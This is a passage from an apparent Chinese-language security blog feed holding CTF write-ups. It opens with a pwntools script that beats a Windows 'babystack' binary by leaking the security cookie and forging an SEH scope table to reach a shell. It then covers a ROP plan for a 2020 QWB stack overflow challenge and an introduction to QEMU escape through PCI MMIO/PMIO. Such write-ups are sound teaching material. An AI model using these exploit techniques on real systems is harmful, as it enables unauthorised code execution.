pause()</span><br><span class="line"></span><br><span class="line">p = run()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;stack address = 0x&#x27;</span>)</span><br><span class="line">stack_address = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;stack_address&quot;</span>,stack_address)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">main_addr = <span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;main_address&quot;</span>,main_addr)</span><br><span class="line"></span><br><span class="line">___security_cookie_addr=main_addr+<span class="number">0x2F54</span></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="built_in">str</span>(___security_cookie_addr).encode())</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">___security_cookie_value=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;__security_cookie_value&quot;</span>,___security_cookie_value)</span><br><span class="line"></span><br><span class="line">ebp_addr=stack_address+<span class="number">0x9C</span></span><br><span class="line">gs_addr=ebp_addr-<span class="number">0x1C</span></span><br><span class="line">next_addr=ebp_addr-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="built_in">str</span>(gs_addr).encode())</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">gs_value=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;gs_value&quot;</span>,gs_value)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="built_in">str</span>(next_addr).encode())</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">next_value=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&quot;next_value&quot;</span>,next_value)</span><br><span class="line"></span><br><span class="line">shell_addr=main_addr+<span class="number">0x2DD</span></span><br><span class="line"></span><br><span class="line">SEH_scope_table = p32(<span class="number">0x0FFFFFFE4</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFF20</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0</span>)</span><br><span class="line">SEH_scope_table += p32(<span class="number">0xFFFFFFFE</span>)</span><br><span class="line">SEH_scope_table += p32(shell_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload=SEH_scope_table.ljust(0x80,b&#x27;a&#x27;)+p32(ebp_addr^___security_cookie_value)+b&#x27;b&#x27;*8+p32(next_value)+p32(main_addr + 944)</span></span><br><span class="line"><span class="comment"># payload+=p32(stack_address^___security_cookie_value)+p32(0)</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">4</span>+SEH_scope_table.ljust(<span class="number">0x80</span>-<span class="number">4</span>,<span class="string">b&quot;\x22&quot;</span>)+p32(ebp_addr^___security_cookie_value)+<span class="string">b&quot;b&quot;</span>*<span class="number">8</span>+p32(next_value)</span><br><span class="line">payload+= p32(main_addr + <span class="number">944</span>)+p32((stack_address+<span class="number">4</span>)^___security_cookie_value)+p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;more?\r\n&#x27;</span>,<span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Where do you want to know\r\n&#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Windows [�汾 10.0.22631.5189]</span><br><span class="line">(c) Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">D:\win_pwn\babystack&gt;</span><br></pre></td></tr></table></figure><blockquote><p>总结一下：</p><p>如果在32位的windows下，要打SEH需要以下的条件：</p><ol><li>泄露<code>__security_cookie</code>（codebase+offset）</li><li>可以泄露栈上的数据（<code>GS、next_value</code>）</li></ol></blockquote><h3 id="2020qwb-stackoverflow"><a href="#2020qwb-stackoverflow" class="headerlink" title="2020qwb_stackoverflow"></a>2020qwb_stackoverflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rax</span></span><br><span class="line">  FILE *v4; <span class="comment">// rax</span></span><br><span class="line">  FILE *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> DstBuf[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  setbuf(v3, <span class="number">0LL</span>);</span><br><span class="line">  v4 = _acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">  setbuf(v4, <span class="number">0LL</span>);</span><br><span class="line">  v5 = _acrt_iob_func(<span class="number">2u</span>);</span><br><span class="line">  setbuf(v5, <span class="number">0LL</span>);</span><br><span class="line">  v6 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    --v6;</span><br><span class="line">    <span class="built_in">memset</span>(DstBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(DstBuf));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, DstBuf, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;buffer:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(DstBuf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt; <span class="number">0</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以显然看到有一个栈溢出和数据的泄露</p><p>基本上保护都开启了</p><p>思路：</p><ol><li>首先泄露codebase的地址，为之后多次泄露地址做准备，之后泄露第一次的cookie然后就重新一次main</li><li>然后尝试泄露ucrtbase.dll的基址</li><li>ROP打system(“cmd”)</li></ol><p>但是在栈上没发现直接的ucrtbase的地址，在windows的IAT中，类似Linux中的got表，通过泄露这个IAT的数据需要拿到程序的基地址</p><p>就不再多赘述</p><h2 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h2><p>首先通过win_server</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win_server ./babyoverflow.exe 1234</span><br></pre></td></tr></table></figure><p>将这个服务映射到本地<code>127.0.0.1</code>的<code>1234</code>端口上</p><p>然后就可以用pwntools来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1234</span>)</span><br></pre></td></tr></table></figure><p>来访问这个服务</p><p>然后通过x32dbg或x64dbg的文件-&gt;附加-&gt;选择对应的进程pid，就可以进行调试辣</p><p>记住在python脚本中要在准备调试的地方前用pause()停下</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;window-pwn&quot;&gt;&lt;a href=&quot;#window-pwn&quot; class=&quot;headerlink&quot; title=&quot;window_pwn&quot;&gt;&lt;/a&gt;window_pwn&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post</summary>
      
    
    
    
    <category term="windows" scheme="http://s1nec-1o.github.io/categories/windows/"/>
    
    <category term="pwn" scheme="http://s1nec-1o.github.io/categories/windows/pwn/"/>
    
    
    <category term="windows pwn" scheme="http://s1nec-1o.github.io/tags/windows-pwn/"/>
    
  </entry>
  
  <entry>
    <title>Qemu逃逸初识</title>
    <link href="http://s1nec-1o.github.io/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/"/>
    <id>http://s1nec-1o.github.io/2025/05/04/Qemu%E9%80%83%E9%80%B8%E5%88%9D%E8%AF%86/</id>
    <published>2025-05-04T06:09:27.000Z</published>
    <updated>2025-05-04T06:43:49.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qemu逃逸学习"><a href="#qemu逃逸学习" class="headerlink" title="qemu逃逸学习"></a>qemu逃逸学习</h1><p>CTF中的qemu逃逸便是通过在qemu源码中注册一个新的pci，来模拟真实环境下的某一个pci外设，例如键盘控制器之类？通过构造特定的Guest操作触发漏洞（一般是越界读写），最终在Host上获得shell读取flag，主要还是侧重于代码的逆向和漏洞的利用技巧。</p><p>实战中的或许是类似于针对云服务商的？目标是突破租户隔离，来获得宿主机的敏感信息吧，还是非常有意思滴！！！</p><blockquote><p>原文：<a href="https://xz.aliyun.com/news/6166">https://xz.aliyun.com/news/6166</a></p><p>只做学习记录和批注</p><p>好文：<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/">https://xuanxuanblingbling.github.io/ctf/pwn/2022/06/09/qemu/</a></p></blockquote><h2 id="qemu概述"><a href="#qemu概述" class="headerlink" title="qemu概述"></a>qemu概述</h2><p>运行的每个<code>qemu</code>虚拟机都相应的是一个qemu进程，从本质上看，虚拟出的每个虚拟机对应 <code>host</code> 上的一个 <code>qemu</code> 进程，而虚拟机的执行线程（如 <code>CPU</code> 线程、<code>I/O</code> 线程等）对应 <code>qemu</code> 进程的一个线程。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505041433067.png" alt="image-20250501211959652" style="zoom: 33%;" /><blockquote><p>其中**客户机系统 (Guest)**：运行在 QEMU 之上，是虚拟机中安装的操作系统。</p><p>客户机系统认为自己直接运行在硬件上，但实际上是<strong>通过 QEMU 与底层硬件交互</strong>。</p></blockquote><p>qemu虚拟机内存所对应的真实内存结构如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Guest&#x27; processes</span><br><span class="line">                     +--------------------+</span><br><span class="line">Virtual addr space   |                    |</span><br><span class="line">                     +--------------------+</span><br><span class="line">                     |                    |</span><br><span class="line">                     \__   Page Table     \__</span><br><span class="line">                        \                    \</span><br><span class="line">                         |                    |  Guest kernel</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">Guest&#x27;s phy. memory |    |                    |                |</span><br><span class="line">                    +----+--------------------+----------------+</span><br><span class="line">                    |                                          |</span><br><span class="line">                    \__                                        \__</span><br><span class="line">                       \                                          \</span><br><span class="line">                        |             QEMU process                 |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">Virtual addr space |    |                                          |</span><br><span class="line">                   +----+------------------------------------------+</span><br><span class="line">                   |                                               |</span><br><span class="line">                    \__                Page Table                   \__</span><br><span class="line">                       \                                               \</span><br><span class="line">                        |                                               |</span><br><span class="line">                   +----+-----------------------------------------------++</span><br><span class="line">Physical memory    |    |                                               ||</span><br><span class="line">                   +----+-----------------------------------------------++</span><br></pre></td></tr></table></figure><p><code>qemu</code>用于模拟设备运行，而qemu逃逸漏洞多发于<strong>模拟pci设备</strong>中，漏洞形成一般是修改<code>qemu-system</code>代码，所以漏洞存在于<code>qemu-system</code>文件内。而逃逸就是指利用漏洞从<code>qemu-system</code>模拟的这个小系统逃到主机内，从而在<code>linux</code>主机内达到命令执行的目的。</p><h2 id="qemu中的地址"><a href="#qemu中的地址" class="headerlink" title="qemu中的地址"></a>qemu中的地址</h2><p>从用户虚拟地址到用户物理地址，从用户物理地址到qemu虚拟地址</p><p>用户的物理内存实际上是<code>qemu</code>程序<code>mmap</code>出来的</p><p><code>-m 1G</code>也就是<code>mmap</code>一块<code>1G</code>的内存</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">       -initrd ./rootfs.cpio \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel ./vmlinuz-5.0.5-generic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -append &quot;priority=low console=ttyS0&quot; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -device pipeline</span><br></pre></td></tr></table></figure><h2 id="pci设备概述"><a href="#pci设备概述" class="headerlink" title="pci设备概述"></a>pci设备概述</h2><p>PCI设备都有一个配置空间（PCI Configuration Space），其记录了关于此设备的详细信息。<strong>大小为256字节</strong>，其中<strong>头部64字节是PCI标准规定</strong>的，当然并非所有的项都必须填充，位置是固定了，没有用到可以填充0。<strong>前16个字节的格式是一定的</strong>，包含头部的类型、设备的总类、设备的性质以及制造商等，格式如下：</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505041433069.png" alt="image-20250501230817541" style="zoom:33%;" /><p>比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505041433070.png" alt="image-20250501230916132" style="zoom: 50%;" /><p>当BAR最后一位<strong>为0表示这是映射的I&#x2F;O内存</strong>，<strong>为1是表示这是I&#x2F;O端口</strong>，当是I&#x2F;O内存的时候1-2位表示内存的类型，<strong>bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。</strong></p><p>当最后一位为1时表示映射的I&#x2F;O端口。I&#x2F;O端口一般<strong>不支持预取</strong>，所以这里是29位的地址。</p><p>通过memory space访问设备I&#x2F;O的方式称为memory mapped I&#x2F;O，即<strong>MMIO</strong>，这种情况下，CPU直接使用<strong>普通访存指令即可访问设备I&#x2F;O</strong>。</p><p>通过I&#x2F;O space访问设备I&#x2F;O的方式称为<strong>port I&#x2F;O</strong>，或者port mapped I&#x2F;O，这种情况下CPU需要使用<strong>专门的I&#x2F;O指令如<code>IN/OUT</code>访问I&#x2F;O端口。</strong></p><p>在<strong>MMIO</strong>中，<strong>内存和I&#x2F;O设备共享同一个地址空间。</strong> MMIO是应用得最为广泛的一种I&#x2F;O方法，它<strong>使用相同的地址总线</strong>来处理内存和I&#x2F;O设备，I&#x2F;O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I&#x2F;O设备的内存，用于访问内存的CPU指令也可来访问I&#x2F;O设备。<strong>每个I&#x2F;O设备监视CPU的地址总线</strong>，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I&#x2F;O设备，CPU必须预留给I&#x2F;O一个地址区域，该地址区域不能给物理内存使用。</p><p>在<strong>PMIO</strong>中，内存和I&#x2F;O设备有各自的地址空间。 端口映射I&#x2F;O通常使用一种特殊的CPU指令，专门执行I&#x2F;O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读&#x2F;写1,2,4个字节（例如：<code>outb</code>, <code>outw</code>, <code>outl</code>）到IO设备上。<strong>I&#x2F;O设备有一个与内存不同的地址空间</strong>，为了实现地址空间的隔离，要么在CPU物理接口上<strong>增加一个I&#x2F;O引脚</strong>，要么<strong>增加一条专用的I&#x2F;O总线</strong>。由于I&#x2F;O地址空间与内存地址空间是隔离的，所以有时将<strong>PMIO称为被隔离的IO</strong>(Isolated I&#x2F;O)。</p><h2 id="pci设备inQemu"><a href="#pci设备inQemu" class="headerlink" title="pci设备inQemu"></a>pci设备inQemu</h2><p><strong>pci设备的寻址是由总线、设备以及功能构成。</strong>如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci</span><br><span class="line">00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)</span><br><span class="line">00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]</span><br><span class="line">00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]</span><br><span class="line">00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)</span><br><span class="line">00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)</span><br></pre></td></tr></table></figure><p><code>xx:yy:z</code>的格式为<code>总线:设备:功能</code>的格式。</p><p>其中<code>[0000]</code>表示pci的域， PCI域最多可以<strong>承载256条总线</strong>。 每条总线最多可以有<strong>32个设备</strong>，每个设备最多可以<strong>有8个功能</strong>。</p><p>总之每个 PCI 设备有<strong>一个总线号, 一个设备号, 一个功能号标识。</strong>PCI 规范允许单个系统占用多达 256 个总线, 但是因为 256 个总线对许多大系统是不够的, Linux 现在支持 PCI 域。<strong>每个 PCI 域可以占用多达 256 个总线. 每个总线占用 32 个设备</strong>, 每个设备可以是 一个多功能卡(例如一个声音设备, 带有一个附加的 CD-ROM 驱动)<strong>有最多 8 个功能</strong>。</p><p>PCI 设备通过<code>VendorIDs</code>、<code>DeviceIDs</code>、以及<code>Class Codes</code>字段区分：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -m -n -s <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Device: <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Class:  <span class="number">00f</span>f</span><br><span class="line">Vendor: <span class="number">1234</span></span><br><span class="line">Device: <span class="number">11e9</span></span><br><span class="line">SVendor:        <span class="number">1</span>af4</span><br><span class="line">SDevice:        <span class="number">1100</span></span><br><span class="line">PhySlot:        <span class="number">3</span></span><br><span class="line">Rev:    <span class="number">10</span></span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~$ lspci -v -m -s <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Device: <span class="number">00</span>:<span class="number">03.0</span></span><br><span class="line">Class:  Unclassified device [<span class="number">00f</span>f]</span><br><span class="line">Vendor: Vendor <span class="number">1234</span></span><br><span class="line">Device: Device <span class="number">11e9</span></span><br><span class="line">SVendor:        Red Hat, Inc</span><br><span class="line">SDevice:        Device <span class="number">1100</span></span><br><span class="line">PhySlot:        <span class="number">3</span></span><br><span class="line">Rev:    <span class="number">10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>也可通过查看其<code>config</code>文件来查看设备的配置空间，数据都可以匹配上，如前两个字节<code>1234</code>为<code>vendor id</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\:00/0000\:00\:03.0/config</span><br><span class="line">0000000 1234 11e9 0103 0000 0010 00ff 0000 0000</span><br><span class="line">0000010 1000 febf c051 0000 0000 0000 0000 0000</span><br><span class="line">0000020 0000 0000 0000 0000 0000 0000 1af4 1100</span><br><span class="line">0000030 0000 0000 0000 0000 0000 0000 0000 0000</span><br></pre></td></tr></table></figure><p>查看设备内存空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x</span><br><span class="line">00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)</span><br><span class="line">        Subsystem: Red Hat, Inc Device 1100</span><br><span class="line">        Physical Slot: 3</span><br><span class="line">        Flags: fast devsel</span><br><span class="line">        Memory at febf1000 (32-bit, non-prefetchable) [size=256]</span><br><span class="line">        I/O ports at c050 [size=8]</span><br><span class="line">00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00</span><br><span class="line">10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11</span><br><span class="line">30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>可以看到该设备有两个空间：<code>BAR0</code>为<code>MMIO</code>空间，地址为<code>febf1000</code>，大小为<code>256</code>；<code>BAR1</code>为<code>PMIO</code>空间，端口地址为<code>0xc050</code>，大小为<code>8</code>。</p><p>可以通过查看<code>resource</code>文件来查看其相应的内存空间：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/</span><br><span class="line">...</span><br><span class="line">-r--r--r--  1 root root 4096 Aug  1 03:40 resource</span><br><span class="line">-rw-------  1 root root  256 Jul 31 13:18 resource0</span><br><span class="line">-rw-------  1 root root    8 Aug  1 04:01 resource1</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>resource</code>文件包含其它相应空间的数据，如<code>resource0</code>（<code>MMIO</code>空间）以及<code>resource1</code>（<code>PMIO</code>空间）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource</span><br><span class="line">0x00000000febf1000 0x00000000febf10ff 0x0000000000040200</span><br><span class="line">0x000000000000c050 0x000000000000c057 0x0000000000040101</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>每行分别表示相应空间的起始地址（<code>start-address</code>）、结束地址（<code>end-address</code>）以及标识位（<code>flags</code>）。</p><h2 id="qemu中访问I-O空间"><a href="#qemu中访问I-O空间" class="headerlink" title="qemu中访问I&#x2F;O空间"></a>qemu中访问I&#x2F;O空间</h2><p>存在<code>mmio</code>与<code>pmio</code>，那么在系统中该如何访问这两个空间呢？访问<code>mmio</code>与<code>pmio</code>都可以采用<strong>在内核态访问</strong>或<strong>在用户空间编程进行访问</strong>。</p><h3 id="访问mmio"><a href="#访问mmio" class="headerlink" title="访问mmio"></a>访问mmio</h3><p>编译<strong>内核</strong>模块，在内核态访问mmio空间，示例代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/io.h&gt;</span>      <span class="comment">// 提供 I/O 内存访问函数（如 readb/writeb）</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span> <span class="comment">// 提供资源管理相关函数（如 request_mem_region）</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> addr = <span class="built_in">ioremap</span>(ioaddr, iomemsize); <span class="comment">//将物理地址 ioaddr 映射到内核的虚拟地址空间，返回虚拟地址 addr。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">readb</span>(addr);  <span class="comment">// 读取 1 字节（8 位）</span></span><br><span class="line"><span class="built_in">readw</span>(addr);  <span class="comment">// 读取 2 字节（16 位）</span></span><br><span class="line"><span class="built_in">readl</span>(addr);  <span class="comment">// 读取 4 字节（32 位）</span></span><br><span class="line"><span class="built_in">readq</span>(addr);  <span class="comment">// 读取 8 字节（64 位，仅在 64 位系统支持）</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">writeb</span>(val, addr);  <span class="comment">// 写入 1 字节</span></span><br><span class="line"><span class="built_in">writew</span>(val, addr);  <span class="comment">// 写入 2 字节</span></span><br><span class="line"><span class="built_in">writel</span>(val, addr);  <span class="comment">// 写入 4 字节</span></span><br><span class="line"><span class="built_in">writeq</span>(val, addr);  <span class="comment">// 写入 8 字节</span></span><br><span class="line"><span class="built_in">iounmap</span>(addr);</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ioport.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __iomem *addr;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 申请资源</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">request_mem_region</span>(ioaddr, iomemsize, <span class="string">&quot;my_device&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> -EBUSY;  <span class="comment">// 资源已被占用</span></span><br><span 